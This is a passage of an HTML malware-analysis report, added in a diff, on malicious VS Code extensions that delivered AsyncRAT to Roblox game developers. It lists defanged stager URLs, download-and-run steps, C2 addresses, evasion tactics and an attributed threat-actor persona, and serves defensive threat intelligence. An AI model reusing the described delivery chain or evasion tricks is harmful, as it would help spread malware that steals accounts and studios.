+    <li><b>Malware Stager Pull &amp; C2 Stream:</b> The extension fetched <code>GET hxxp://pebblexvale[.]com/pxbbzVkahQ5VT.bat</code> from <code>192[.]142[.]48[.]98</code> twice with an empty User-Agent string (the first TCP stream stalled after 12 packets; the second downloaded the 490 KB batch file across 386 packets) and then opened the pinned-certificate AsyncRAT stream to <code>216[.]107[.]137[.]77:56001</code>.</li>
+    <li><b>Interactive Browser Check of <code>192[.]142[.]48[.]98</code>:</b> While interacting with that sandbox run, I typed <code>192[.]142[.]48[.]98</code> into the Chrome address bar (<code>chrome.exe</code>, PID 6456), firing omnibox autocomplete queries for <code>192[.]142[.]48[.]98</code> and <code>192[.]142[.]48[.]98:</code> before loading <code>hxxp://192[.]142[.]48[.]98/</code>.</li>
+    <li><b>cPanel Default Page:</b> Accessing the IP without a virtual-host header returned a cPanel default landing page (<code>/cgi-sys/defaultwebpage.cgi</code>, <code>/img-sys/powered_by_cpanel.svg</code>, <code>IP_changed.png</code>, <code>server_misconfigured.png</code>, and the cPanel <code>wsidchk</code> / <code>pdata</code> redirect), followed by a click-through to <code>hxxps://www[.]cpanel[.]net/</code>.</li>
+  </ol>
+  <p>
+    This confirms that <code>192[.]142[.]48[.]98</code> (which hosts <code>pebblexvale[.]com</code>, <code>pxbble[.]com</code>, and <code>dump-central[.]cc</code>) is a cPanel server, while process correlation separates the RAT traffic on port <code>56001</code> from my browser check and from background sync traffic generated by pre-installed wallet extensions on the golden VM image (<code>sanity-proxy-v2[.]phantom[.]app</code>, <code>data[.]phantom[.]app</code>, and <code>ph[.]xdefi[.]services</code>).
+  </p>
+
+  <h2>3. The "Pebble" (<code>@pxbbz</code>) Persona, Studio Takeovers, and <code>dump-central[.]cc</code></h2>
+  <p>
+    On September 18, 2026, during a detonation of <code>FontingFonts.monkeyfont</code>, the extension requested its second-stage batch file (<code>b1f87428620729e52.bat</code>) from <code>pxbble[.]com</code>. Instead of the batch script, the server returned a 3,941-byte HTML page titled <b>"Pebble's Home"</b>:
+  </p>
+  <blockquote>
+    "pebble - Come work with the #1 verified dev hitter in com 2652 - Made by pebble - Owner of Dark Cube Studio - Verified on Roblox - Username: pebblezn"
+  </blockquote>
+  <p>
+    In the Roblox underground, a "dev hitter" compromises game developers to steal their studio groups, games, and Robux. The page linked to Discord user ID <code>1499262528717324413</code>, Telegram <code>t[.]me/pxbbz</code>, Roblox profile <code>roblox[.]com/users/1175009626/profile</code> (<code>pebblezn</code>), email <code>owner[@]pxbble[.]com</code>, and <code>www[.]dump-central[.]cc</code>.
+  </p>
+  <p>
+    Five independent data points connect this self-published persona to the malware campaign:
+  </p>
+  <ol>
+    <li><b><code>@pxbbz</code> Telegram Profile:</b> The Telegram account <code>@pxbbz</code> (display name "pebble z") describes its owner as a <code>"PHP, JS, ASP Dev"</code>, lists Discord handle <code>f6wg</code> and Roblox username <code>pebblezn</code>, and explicitly claims ownership of both <code>dump-central[.]cc</code> and <code>pxbble[.]com</code>. That self-described web stack matches the division of labor seen in the malware: custom JavaScript extensions and server-side hook APIs paired with an off-the-shelf .NET RAT. On October 24, the stager hosted on <code>pebblexvale[.]com</code> was named <code>pxbbzVkahQ5VT.bat</code>, prefixed with the exact <code>pxbbz</code> handle.</li>
+    <li><b>Dark Cube Studio Takeover (July 31, 2026):</b> A YouTube community post by Dark Cube Studio creator "It's Steven" (<code>youtube[.]com/post/UgkxK3NKfyi2KVWwl_JowtPmPwBdU2DnyI1E</code>) states that the studio's Roblox group was hijacked on July 31, 2026 by an account named <code>"pebble"</code>, corroborating the trophy claim on <code>pxbble[.]com</code>.</li>
+    <li><b>Alias Rotation to <code>viapeq</code> and Second Games:</b> After Dark Cube Studio publicized the takeover, the live text on <code>pxbble[.]com</code> changed to: <code>"pebble. Come work with the #1 verified dev hitter in com. 1221. Made by pebble - Owner of Second Games Verified on Roblox - Username: viapeq."</code></li>
+    <li><b>Rolimon's Fencing and Shared Hosting on <code>192[.]142[.]48[.]98</code>:</b> The handle <code>pxbbz</code> maintains an active trading profile on Rolimon's to trade high-value Roblox items. At the network layer, Sysmon DNS telemetry confirmed that <code>dump-central[.]cc</code> ("CC Dump Central", a carding storefront with the footer "Made by pebble") resolves to <code>192[.]142[.]48[.]98</code>, the same server hosting <code>pxbble[.]com</code> (September 8 to 18) and <code>pebblexvale[.]com</code> (October 24).</li>
+    <li><b>Dev-Hitting Spree, Seven Burgers Hijack, and Blitfum's Video Exposure:</b> Beyond Dark Cube Studio, Pebble's targeted attacks against game creators were thoroughly investigated and exposed by Roblox content creator Blitfum in a dedicated report: <a href="https://www.youtube.com/watch?v=ig2VbeaqFwA&amp;t=37s" target="_blank" rel="noopener"><i>"he STOLE a bunch of games, including one of my favorites..."</i> (YouTube)</a>. The investigation documents how developer "7", owner of the studio group <b>Seven Burgers</b> and creator of the fighting game <i>Something Something Battlegrounds</i> (SSBG), was socially engineered via direct message into executing a malicious info-stealer disguised as a custom developer tool. The malware harvested active browser login cookies to bypass two-factor authentication, after which the hijacked studio and game assets were transferred to Pebble and rebranded under <b>"Pixel Studios"</b>. This directly corroborates the campaign's staging infrastructure on <code>pixelrbx[.]com</code> and <code>pixelstudiodev[.]com</code>. Crucially, it also explains the operator's scoff during the October 6 live C2 chat on VM 408 (<i>"all you did was find the roblox devfourm posts / ur not special"</i>): the operator was already acutely aware that their dev-hitting spree and studio thefts had been exposed across the Roblox DevForum and YouTube.</li>
+  </ol>
+
+  <figure>
+    <div class="fig-grid">
+      <img src="screenshots/telegram_pxbbz.png" alt="@pxbbz Telegram bio" onclick="openLightbox(this.src)">
+      <img src="screenshots/dark_cube_studio_hijack.png" alt="Dark Cube Studio YouTube hijack alert" onclick="openLightbox(this.src)">
+    </div>
+    <figcaption><b>Left:</b> The <code>@pxbbz</code> ("pebble z") Telegram bio claiming <code>dump-central[.]cc</code>, <code>pxbble[.]com</code>, Discord <code>f6wg</code>, and Roblox <code>pebblezn</code>. <b>Right:</b> The July 31, 2026 YouTube community post by "It's Steven" confirming the takeover of Dark Cube Studio by <code>"pebble"</code>.</figcaption>
+  </figure>
+
+  <h2>4. Campaign Evolution Across 216 Extension Versions</h2>
+  <p>
+    Across the entire dataset from May 5 to October 24, 2026, 216 extension versions across 201 publisher IDs match the campaign's code or infrastructure indicators. At the time of analysis, 70 of those versions appeared on Microsoft's removal list as Malware and 8 as Untrustworthy, leaving 138 versions (64%) unlisted. Armed extensions typically show 1,100 to 2,500 installs (consistent with automated install inflation), while the oldest package, <code>Robloxboard.roblox-board</code> (published May 5, 2026), reached 8,813 installs.
+  </p>
+  <ul>
+    <li><b>Wave 1 (May to September 2026, Bundled npm Droppers and Direct Batch Pulls):</b> The earliest package, <code>Robloxboard.roblox-board</code> (versions 2.0.1 and 4.0.1), used <code>"activationEvents": ["*"]</code> to fetch <code>hxxps://giantapplebees[.]shop/555.js</code> to <code>%TEMP%\nice.js</code> and run it via <code>cscript.exe</code>. From June 6 to August 18, the crew published 15 Kanban and Trello look-alikes across 11 publishers (<code>StudioBoard.studioboard</code> through <code>GRSoftworks.Brux-Board</code>) bundling a local <code>node_modules/boardflow/install.js</code> script that curled a batch dropper from rotating domains: <code>pixelrbx[.]com</code> (<code>/846385443</code>) &rarr; <code>giantapplebees[.]shop</code> &rarr; <code>elrbx[.]com</code>. In early September, further packages (<code>BadginLNN.badgerposts</code>, <code>FontingFonts.monkeyfont</code>, <code>MusicCreates.musicicgen</code>, <code>HypeShowG.fastmusicgen</code>, <code>TrellKhan.devora</code>) pulled batch stagers directly from <code>pxbble[.]com</code> and <code>lnterstudios[.]org</code>.</li>
+    <li><b>Wave 2 (September 23 to October 23, 2026, The 150-Stub Sleeper Fleet and Canvas Hooks):</b> On September 23 and 24, the crew used an automated script to publish 152 extension versions (150 empty <code>v0.0.1</code> placeholder stubs of 1,380 to 1,430 bytes, each under its own single-use publisher account) in two bursts: 50 stubs in 20 minutes on September 23 (21:17 to 21:37 UTC, 2.5 stubs/min) and 99 stubs in 21 minutes on September 24 (01:06 to 01:27 UTC, 4.7 stubs/min), plus one final stub shortly after. Publishing code-less stubs allowed the accounts to clear initial Marketplace checks and age before selected packages (<code>framemap-dev</code>, <code>studiodocs-app</code>, <code>kanbantask-prod</code>, <code>trellisboard-app</code>, <code>boardhub-dev</code>, <code>flowcanvas-dev</code>, <code>studiotask-app</code>) were updated to 33 to 40 KB payloads containing the Canvas Hook engine.</li>
+    <li><b>Wave 3 (October 24, 2026, Browser Bot Gating and Rebuilt RAT Suite):</b> On October 24, the operators pushed version 1.2.1 of <code>alphasolutions.studiotask-app</code> and version 1.0.2 of <code>LKKStuner.linkintree</code>, placed <code>pebblexvale[.]com/pxbbzVkahQ5VT.bat</code> behind a JavaScript browser check (so headless Node <code>http.get</code> requests received only an HTML challenge while real browsers received the <code>.bat</code>), and deployed a 300,439-byte Donut build with a refreshed set of panel plugins.</li>
+  </ul>
+
+  <h3>Naming Conventions: Productivity Camouflage vs. the Roblox Tell</h3>
+  <p>
+    A consistent behavioral split runs through the campaign's naming: victim-facing extension titles use corporate productivity themes, while backend domains and handles come from the Roblox exploit scene.
+  </p>
+  <ul>
+    <li><b>Marketplace Camouflage:</b> Wave-1 and Wave-2 extensions imitate Trello, Kanban, and whiteboard tools (<code>studioboard</code>, <code>boardwalk</code>, <code>FocusDeck</code>, <code>LineDeck</code>, <code>SlixBoard</code>, <code>Brux-Board</code>, <code>framemap-dev</code>, <code>kanbantask-prod</code>) under synthetic corporate publisher names (<code>...Softworks</code>, <code>...PLC</code>, <code>ByteLabs</code>, <code>pulsedigital</code>, <code>hiveridge</code>, <code>meridianbyte</code>) or Atlassian typosquats (<code>atIassiansum</code>, <code>AtIassianlm</code>). One personal-style publisher ID stands out: <code>JohnFMerondic.drift-board</code>, notable given <code>SirRatter</code>'s reference to "john" in chat, though no technical link connects them.</li>
+    <li><b>Backend Domains and Handles:</b> By contrast, the infrastructure repeatedly uses Roblox terminology: <code>pixelrbx[.]com</code> and <code>elrbx[.]com</code> (<code>rbx</code> for Roblox/Robux), <code>managerblx123</code> (<code>blx</code> for blox), <code>realism-hub[.]com</code> ("hub" from Roblox script-executor hubs), <code>rogiant[.]com</code> (the <code>ro-</code> prefix), and the <code>pxbble</code> / <code>@pxbbz</code> / <code>pebblexvale[.]com</code> persona.</li>
+    <li><b>Dropper Filenames:</b> Confirmed batch stagers use per-build mixed-case alphanumeric strings to avoid static filename rules: <code>pxbbzVkahQ5VT.bat</code>, <code>b1f87428620729e52.bat</code>, <code>b4dfbba06ccbh.bat</code>, <code>ghtwy6xvtu.bat</code>, <code>jmhu0sljrl.bat</code>, <code>qu1wd4klqw.bat</code>, <code>qvz2wkoybb6tp4wt.bat</code>, and <code>xqbiw5s4j2.bat</code>.</li>
+  </ul>
+
+  <h3>The "Dev Hitter" Vector: Targeting Roblox Creators &amp; Hijacking Game Studios</h3>
+  <p>
+    While the campaign created 150 empty sleeper extensions and dozens of generic Kanban clones to build domain reputation and evade marketplace moderation, forensic cross-referencing confirms that the sharp end of the operation was an active <b>"dev hitter"</b> campaign targeting the Roblox game development community. In the Roblox creator ecosystem, a "dev hitter" specializes in compromising developers to steal their game source code, session credentials, and ownership of lucrative studio groups. On their stager portal (<code>pxbble[.]com</code>), Pebble openly advertised this exact service: <i>"Come work with the #1 verified dev hitter in com."</i>
+  </p>
+  <p>
+    <b>Why VS Code? Weaponizing the Modern Roblox Stack:</b> Serious Roblox game studios do not code inside the basic Roblox Studio script editor. Instead, professional teams write Luau inside Visual Studio Code and synchronize their scripts into the engine in real time using tools like <a href="https://rojo.space/" target="_blank" rel="noopener">Rojo</a>, while managing tasks with external Kanban boards. Seeding malicious extensions on the official Microsoft Visual Studio Code Marketplace granted the actor implicit platform trust. Furthermore, VS Code extension lifecycle hooks (<code>activationEvents: ["*"]</code> or <code>onStartupFinished</code>) guaranteed that the AsyncRAT loader executed silently on IDE launch without generating browser download alerts.
+  </p>
+  <p>
+    <b>The Lures vs. Legitimate Community Tools:</b> Rather than inventing random names, the actor deliberately cloned the branding and workflows of legitimate developer utilities widely discussed on the <b>Roblox Developer Forum (DevForum)</b>:
+  </p>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Campaign Extension</th>
+        <th>Legitimate Tool / Community Workflow Mimicked</th>
+        <th>Targeting Context &amp; Exploitation Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td class="mono">Robloxboard.roblox-board<br><b>(8,813 installs)</b></td>
+        <td><b>BloxBoard</b> &amp; <b>DevBoard / DevTasks</b> (Roblox Studio sprint management plugins)</td>
+        <td>The single most installed package across the entire 216-extension fleet. Promoted on the DevForum as a project management board for Roblox developer teams. Carried the <code>giantapplebees[.]shop</code> JScript stager.</td>
+      </tr>
+      <tr>
+        <td class="mono">EthanRose.taskblox</td>
+        <td>TaskBlox / DevTasks workflow tools</td>
+        <td>Targeted Roblox developers managing multi-developer build sprints. Delivered JScript stagers from <code>giantapplebees[.]shop</code>.</td>
+      </tr>
+      <tr>
+        <td class="mono">RealismHub.trello-management</td>
+        <td><b>MaximumADHD/Character-Realism</b> (open-source immersion system by CloneTrooper1019) + exploit "Hub" terminology</td>
+        <td>Traded on the widely trusted "Realism" brand known across the developer community, combined with Roblox script-executor terminology. Fetched payloads from <code>pixelrbx[.]com</code>.</td>
+      </tr>
+      <tr>
+        <td class="mono">LuaStyle.kit-toolbox<br>flowstate.luaslope</td>
+        <td><b>Roblox Studio Toolbox</b> &amp; <b>StyLua</b> / <b>Selene</b> (Luau formatters and linters)</td>
+        <td>Lua is the sole language of Roblox. Mimicked Luau code formatters and the built-in Studio Toolbox (where creators source starter kits and asset models). Beaconed directly to RAT server <code>185[.]94[.]29[.]79:56001</code>.</td>
+      </tr>
+      <tr>
+        <td class="mono">FontingFonts.monkeyfont<br>MusicCreates.musicicgen<br>HypeShowG.fastmusicgen</td>
+        <td>Game GUI typography &amp; background soundtrack generators</td>
+        <td>Targeted game creators seeking automated assets for game interfaces and audio tracks. Served batch droppers from <code>pxbble[.]com</code> (including the <code>b1f87428620729e52.bat</code> stager).</td>
+      </tr>
+      <tr>
+        <td class="mono">broblx8x.manager2blx2<br>testpublisher610.managerblx123</td>
+        <td>Studio management shortcuts (command: <code>ManageRBLX: Open Task Board</code>)</td>
+        <td>Targeted developers seeking palette shortcuts to coordinate Studio assets and task queues.</td>
+      </tr>
+      <tr>
+        <td class="mono">BadginLNN.badgerposts</td>
+        <td>DevForum community badge &amp; post synchronizer</td>
+        <td>Promoted directly on the Roblox DevForum in September 2026. Publicly identified by community members as a tool used to compromise developers whose groups were flipped to <b>Pixel Studios</b>.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <p>
+    <b>Confirmed Target Games, Studio Thefts, and Fencing:</b> The operational goal was not passive botnet recruitment, but targeted studio theft and financial liquidation:
+  </p>
+  <ul>
+    <li><b>Seven Burgers (*Something Something Battlegrounds*):</b> Developer "7", creator of the viral multi-million visit battlegrounds game, was socially engineered into executing malware disguised as developer tooling. The infostealer extracted their active <code>.ROBLOSECURITY</code> session cookie to bypass two-factor authentication, seizing the Seven Burgers studio group and game places. As exposed by creator Blitfum in their <a href="https://www.youtube.com/watch?v=ig2VbeaqFwA&amp;t=37s" target="_blank" rel="noopener">YouTube investigation</a>, ownership was transferred to Pebble and rebranded under <b>Pixel Studios</b>.</li>
+    <li><b>Dark Cube Studio:</b> Studio group hijacked on July 31, 2026 by an account named <code>"pebble"</code> (confirmed by creator "It's Steven" and showcased as a trophy on <code>pxbble[.]com</code>).</li>
+    <li><b>The Button Room &amp; Second Games:</b> Creator Pythox (<i>The Button Room</i>) was compromised via the identical playbook, and Second Games was advertised as an owned trophy by Pebble under alias <code>viapeq</code>.</li>
+    <li><b>Fencing via Pixel Studios &amp; Rolimon's:</b> The threat actor monetized stolen assets through a dual pipeline: ongoing game revenue was funneled through <b>Pixel Studios</b> (corroborating staging hosts <code>pixelrbx[.]com</code> and <code>pixelstudiodev[.]com</code>), while high-value limited items were fenced through an active profile on Rolimon's.</li>
+  </ul>
+  <p>
+    <b>Closing the Loop on the Operator Chat:</b> This ecosystem context provides the exact missing link to the live C2 chat on VM 408 on October 6. When the operator scoffed: <i>"all you did was find the roblox devfourm posts / ur not special"</i>, they were not guessing. Pebble and their co-operators were actively monitoring the DevForum threads where victimized developers had begun exposing the fake extensions, the stolen groups, and the Pixel Studios rebrand.
+  </p>
+
+  <h3>How the Lab Wave Changed Over Time</h3>
+  <p>
+    Tracing the 122 detonations across August, September, and October reveals how the operator systematically adapted infrastructure and payload delivery:
+  </p>
+  <ul>
+    <li><strong>Late August to Mid-September:</strong> The actor retained the same <code>boardflow</code> npm dependency and <code>_0x</code>-obfuscated <code>install.js</code> as Wave 1, but began rotating publisher IDs on almost an extension-by-extension basis (such as <code>AgendaStudios</code> to <code>AgendaLLC</code>, <code>PRSoftworks</code>, <code>flownalks</code>, <code>PhanBanLLC</code>, and Atlassian typosquats like <code>atIassiansum</code> and <code>AtIassianlm</code>). Cover themes expanded rapidly beyond project management boards into typography (<code>monkeyfont</code>), audio generation (<code>musicicgen</code>, <code>fastmusicgen</code>), Lua and Roblox studio tooling (<code>kit-toolbox</code>, <code>luastyle</code>), and Notepad clones. C2 operations shifted to <code>216[.]107[.]139[.]88</code> and then to <code>185[.]94[.]29[.]79</code>, consistently over port <code>56001</code> under the pinned <code>CN=Hlkfsmwtezz</code> certificate.</li>
+    <li><strong>October:</strong> C2 consolidated back onto <code>216[.]107[.]137[.]77:56001</code>. Crucially, the loader completely abandoned the telltale <code>boardflow</code> npm package name: extensions like <code>framemap-dev</code>, <code>studiodocs-app</code>, <code>studiotask-app</code>, and <code>linkintree</code> connected directly to the same port 56001 RAT with no npm dependency at all. Staging shifted to <code>pebblexvale[.]com</code> delivering <code>pxbbz</code>-prefixed batch droppers, cementing the operational security slip that ties the infrastructure directly to the operator handle <strong>Pebble</strong>.</li>
+  </ul>
+
+    <h3>Sandbox-Detonated Extension Roster (36 Extensions, 41 Builds, 122 Detonations)</h3>
+  <p>
+    Between August 19 and October 24, 2026, the sandbox detonated 36 distinct malicious extensions (41 builds) across 122 runs that linked to the campaign via the bundled <code>boardflow</code> module, an outbound connection to the <code>:56001</code> C2 cluster, or a stager pull from <code>pxbble[.]com</code> / <code>pebblexvale[.]com</code>:
+  </p>
+  <table>
+    <thead>
+      <tr>
+        <th>First Seen (UTC)</th>
+        <th>Extension ID &amp; Version</th>
+        <th>Runs</th>
+        <th>Campaign Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td class="mono">2026-08-21</td><td class="mono">LineInnovation.LineDeck 1.0.0</td><td class="mono">1</td><td>Bundled <code>boardflow</code> npm loader &rarr; <code>elrbx[.]com</code></td></tr>
+      <tr><td class="mono">2026-08-27</td><td class="mono">AgendaStudios.frux-board 1.0.1</td><td class="mono">7</td><td>Bundled <code>boardflow</code> npm loader &rarr; <code>lnterstudios[.]org/846385d443.bat</code></td></tr>
+      <tr><td class="mono">2026-08-28</td><td class="mono">PRSoftworks.vlux-board 1.0.1</td><td class="mono">2</td><td>Bundled <code>boardflow</code> loader + <code>lnterstudios[.]org/846385d443.bat</code> + dependency on <code>typewriter-keyin</code></td></tr>
+      <tr><td class="mono">2026-09-03</td><td class="mono">TypinKey.typewritin-keyal 1.0.1</td><td class="mono">1</td><td>Bundled loader + <code>216[.]107[.]139[.]88:56001</code> + <code>lnterstudios[.]org/7f82614a.bat</code></td></tr>
+      <tr><td class="mono">2026-09-06</td><td class="mono">AgendaLLC.zlux-board 1.0.1</td><td class="mono">1</td><td>Bundled <code>boardflow</code> npm loader</td></tr>
+      <tr><td class="mono">2026-09-07</td><td class="mono">NotePadExtra.notepadextraplus 1.0.1</td><td class="mono">2</td><td>Bundled <code>boardflow</code> npm loader + <code>lnterstudios[.]org/846385d443.bat</code></td></tr>
+      <tr><td class="mono">2026-09-08</td><td class="mono">LaunchAppsLLC.launchdesk-app 1.0.0 to 1.0.1</td><td class="mono">2</td><td>Bundled <code>vs-modules/resources.js</code> &rarr; <code>boardflow[.]uk/package-update</code></td></tr>
+      <tr><td class="mono">2026-09-08</td><td class="mono">TrellKhan.devora 1.0.2</td><td class="mono">1</td><td>Bundled loader + <code>:56001</code> C2 + <code>pxbble[.]com/b1f87428620729e52.bat</code></td></tr>
+      <tr><td class="mono">2026-09-08</td><td class="mono">BadginLNN.badgerposts 1.0.1</td><td class="mono">3</td><td>Bundled loader + <code>lnterstudios[.]org</code> (v1.0.1) and <code>pxbble[.]com</code> (v1.0.2); cited on Roblox DevForum as used in developer account takeovers rebranded to Pixel Studios</td></tr>
+      <tr><td class="mono">2026-09-08</td><td class="mono">MicroLLC.typewriter-keyin 1.0.1</td><td class="mono">1</td><td>Bundled <code>boardflow</code> npm loader + <code>lnterstudios[.]org/7f82614a.bat</code></td></tr>
+      <tr><td class="mono">2026-09-08</td><td class="mono">HypeShowG.fastmusicgen 1.0.1</td><td class="mono">1</td><td>Bundled loader + <code>216[.]107[.]139[.]88:56001</code> + <code>pxbble[.]com/b1f87428620729e52.bat</code></td></tr>
+      <tr><td class="mono">2026-09-09</td><td class="mono">MusicCreates.musicicgen 1.0.1</td><td class="mono">1</td><td>Byte-identical <code>install.js</code> seed (<code>_0x53192b</code>) to <code>monkeyfont</code> + <code>pxbble[.]com</code></td></tr>
+      <tr><td class="mono">2026-09-09</td><td class="mono">FontingFonts.monkeyfont 1.0.0</td><td class="mono">3</td><td>Bundled loader + <code>216[.]107[.]139[.]88:56001</code> + <code>pxbble[.]com/b1f87428620729e52.bat</code></td></tr>
+      <tr><td class="mono">2026-09-10</td><td class="mono">AppLaunchLLC.desk-24129806 1.0.0</td><td class="mono">1</td><td>Bundled <code>boardflow</code> npm loader</td></tr>
+      <tr><td class="mono">2026-09-14</td><td class="mono">ToolingForAll.toolingforalls 1.0.2</td><td class="mono">5</td><td>Bundled loader + <code>:56001</code> C2</td></tr>
+      <tr><td class="mono">2026-09-15</td><td class="mono">LuaStyle.kit-toolbox 1.0.1 to 1.0.2</td><td class="mono">5</td><td>Bundled loader + <code>185[.]94[.]29[.]79:56001</code></td></tr>
+      <tr><td class="mono">2026-09-17</td><td class="mono">Tumricas.wombopoc 1.0.1</td><td class="mono">2</td><td>Bundled <code>boardflow</code> npm loader</td></tr>
+      <tr><td class="mono">2026-09-18</td><td class="mono">Lommin.workoran 1.0.2</td><td class="mono">7</td><td>Bundled <code>boardflow</code> npm loader</td></tr>
+      <tr><td class="mono">2026-09-19</td><td class="mono">atIassiansum.Trello-Boards 1.0.1</td><td class="mono">5</td><td>Bundled loader + <code>216[.]107[.]139[.]88:56001</code></td></tr>
+      <tr><td class="mono">2026-09-19</td><td class="mono">AtIassianlm.Trello-Boarding 1.0.1</td><td class="mono">5</td><td>Bundled loader + <code>216[.]107[.]139[.]88:56001</code></td></tr>
+      <tr><td class="mono">2026-09-21</td><td class="mono">flownalks.NexoraBoard 1.0.1</td><td class="mono">3</td><td>Bundled loader + <code>216[.]107[.]139[.]88:56001</code></td></tr>
+      <tr><td class="mono">2026-09-21</td><td class="mono">flownalks.Flowridens 1.0.2</td><td class="mono">2</td><td>Bundled loader + <code>216[.]107[.]139[.]88:56001</code></td></tr>
+      <tr><td class="mono">2026-09-21</td><td class="mono">PhanBanLLC.BoardlyUp 1.0.2</td><td class="mono">5</td><td>Bundled loader + <code>216[.]107[.]139[.]88:56001</code></td></tr>
+      <tr><td class="mono">2026-10-02</td><td class="mono">AppLaunchLLC / LaunchAppsLLC desk-########</td><td class="mono">10</td><td>10 serial-named <code>desk-&lt;digits&gt;</code> variants published in two sub-minute bursts</td></tr>
+      <tr><td class="mono">2026-10-02</td><td class="mono">pulsedigital.framemap-dev 0.2.0</td><td class="mono">1</td><td>Canvas Hook loader &rarr; <code>216[.]107[.]137[.]77:56001</code></td></tr>
+      <tr><td class="mono">2026-10-05</td><td class="mono">dawngroup.studiodocs-app 0.2.0</td><td class="mono">1</td><td>Canvas Hook loader &rarr; <code>216[.]107[.]137[.]77:56001</code></td></tr>
+      <tr><td class="mono">2026-10-24</td><td class="mono">alphasolutions.studiotask-app 1.2.1</td><td class="mono">1</td><td>Canvas Hook &rarr; <code>vibes-effecting[.]vercel[.]app/BguYyUsWDTi4.js</code> &rarr; <code>216[.]107[.]137[.]77:56001</code></td></tr>
+      <tr><td class="mono">2026-10-24</td><td class="mono">LKKStuner.linkintree 1.0.2</td><td class="mono">2</td><td><code>pebblexvale[.]com/pxbbzVkahQ5VT.bat</code> &rarr; <code>216[.]107[.]137[.]77:56001</code></td></tr>
+    </tbody>
+  </table>
+
+  <div class="takeaways" style="border-left-color: var(--amber);">
+    <h3>Unconfirmed Look-Alikes Kept Separate</h3>
+    <ul>
+      <li><b><code>Robloxboard.roblox-board</code> 2.0.1 / 4.0.1 (5 runs, September 18 to October 5):</b> Statically contains the <code>giantapplebees[.]shop/555.js</code> stager (also shared by <code>EthanRose.taskblox</code> 2.1.0 to 2.3.0), but the domain was already dark during late-September sandbox runs. Version 4.0.6 removed the stager while retaining the <code>child_process</code> import.</li>
+      <li><b><code>broblx8x.manager2blx2</code> 1.0.0 (1 run, September 16):</b> Registered only a command palette stub (<code>ManageRBLX: Open Task Board</code>) with no network or file activity.</li>
+      <li><b><code>b3e1379e763c84c598fbf49006b46b6df57499efbaf6d018fdc5b236c756cdd8.exe</code> (1 run, August 19):</b> Standalone AsyncRAT sample connecting to <code>207[.]180[.]58[.]21:56001</code> without the <code>IntelDriver\VQR.cmd</code> loader, the <code>CN=Hlkfsmwtezz</code> certificate, or the campaign's crypter stub.</li>
+      <li><b><code>Superkawaii</code> (<code>smiletime.pandatask</code> v0.0.1 at 84,780 B &amp; <code>flowstate.luaslope</code> v0.0.1 at 2,655 B):</b> Across 7 runs, these extensions contacted only <code>superkawaii[.]click</code> and shared no code or infrastructure with this campaign.</li>
+    </ul>
+  </div>
+
+  <h2>5. Infrastructure Convergence and Code-Level Linkage</h2>
+  <p>
+    Only the first two stages of the infection chain (the VS Code extension lures and the Canvas Hook delivery API) were written by the operators. From the batch stager onward, all three waves rely on the same host loader, the same Donut crypter wrapper, and the same three-server AsyncRAT tier.
+  </p>
+
+  <h3>5.1 The Convergence Funnel: From 201 Publishers to Four Shared Choke Points</h3>
+
+  <div class="convergence-funnel">
+    <!-- Top Wide Surface Layer -->
+    <div class="funnel-top-box">
+      <div class="funnel-top-header">
+        <span class="funnel-top-kicker">Outer Layer &middot; Extension Lures &amp; Hook APIs</span>
+        <span class="funnel-top-stat">216 Versions &middot; 201 Publishers (May to Oct 2026)</span>
+      </div>
+      <div class="funnel-waves-grid">
+        <div class="funnel-wave-card">
+          <div class="w-phase">Wave 1 &middot; May 5 to Sep 21, 2026</div>
+          <div class="w-title">npm &amp; Direct Batch Droppers</div>
+          <p><code>Robloxboard.roblox-board</code> + 15 Kanban/Trello clones bundling <code>node_modules/boardflow/install.js</code> + direct <code>.bat</code> pulls from <code>lnterstudios[.]org</code>, <code>pxbble[.]com</code>, and <code>elrbx[.]com</code>.</p>
+        </div>
+        <div class="funnel-wave-card">
+          <div class="w-phase">Wave 2 &middot; Sep 23 to Oct 23, 2026</div>
+          <div class="w-title">150-Stub Sleeper Fleet &amp; Canvas Hooks</div>
+          <p>150 empty <code>v0.0.1</code> stubs published in two ~20-minute bursts, selectively updated to 33 to 40 KB extensions polling <code>vibes-effecting[.]vercel[.]app</code>, <code>canvases[.]work</code>, and <code>canvases[.]ink</code>.</p>
+        </div>
+        <div class="funnel-wave-card">
+          <div class="w-phase">Wave 3 &middot; Oct 24, 2026</div>
+          <div class="w-title">Browser Bot-Gated Delivery</div>
+          <p>Re-armed extensions (<code>studiotask-app 1.2.1</code>, <code>linkintree 1.0.2</code>) routing stager pulls through a JS browser check on <code>pebblexvale[.]com/pxbbzVkahQ5VT.bat</code>.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- SVG Funnel Neck -->
+    <svg class="funnel-svg-neck" viewBox="0 0 840 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <path d="M140 2 C140 34, 420 26, 420 58" stroke="#f59e0b" stroke-width="2" stroke-dasharray="5 4" stroke-opacity="0.65"/>
+      <path d="M420 2 L420 58" stroke="#38bdf8" stroke-width="2.5" stroke-opacity="0.85"/>
+      <path d="M700 2 C700 34, 420 26, 420 58" stroke="#f59e0b" stroke-width="2" stroke-dasharray="5 4" stroke-opacity="0.65"/>
+      <circle cx="420" cy="58" r="5" fill="#38bdf8"/>
+    </svg>
+
+    <!-- Choke Point 1 -->
+    <div class="funnel-stage cp-1">
+      <div class="cp-meta">
+        <span class="cp-badge">Stage 1 &middot; Stager Host</span>
+        <h4>cPanel Server 192[.]142[.]48[.]98</h4>
+        <div class="cp-sub">Active Sep 8 to Oct 24, 2026</div>
+      </div>
+      <div class="cp-body">
+        Co-hosts Wave-1 stager domain <code>pxbble[.]com</code> (<code>b1f87428620729e52.bat</code>), Wave-3 gated domain <code>pebblexvale[.]com</code> (<code>pxbbzVkahQ5VT.bat</code>), and carding storefront <code>dump-central[.]cc</code>.
+      </div>
+      <div class="cp-lock">
+        <span class="lock-label">Infrastructure Link</span>
+        Ties the September and October batch stagers to the "Pebble's Home" page and the <code>@pxbbz</code> Telegram bio.
+      </div>
+    </div>
+
+    <div class="funnel-arrow">&#9660;</div>
+
+    <!-- Choke Point 2 -->
+    <div class="funnel-stage cp-2">
+      <div class="cp-meta">
+        <span class="cp-badge">Stage 2 &middot; Host Loader</span>
+        <h4>IntelDriver\VQR.cmd</h4>
+        <div class="cp-sub">Renamed PowerShell + Task XML</div>
+      </div>
+      <div class="cp-body">
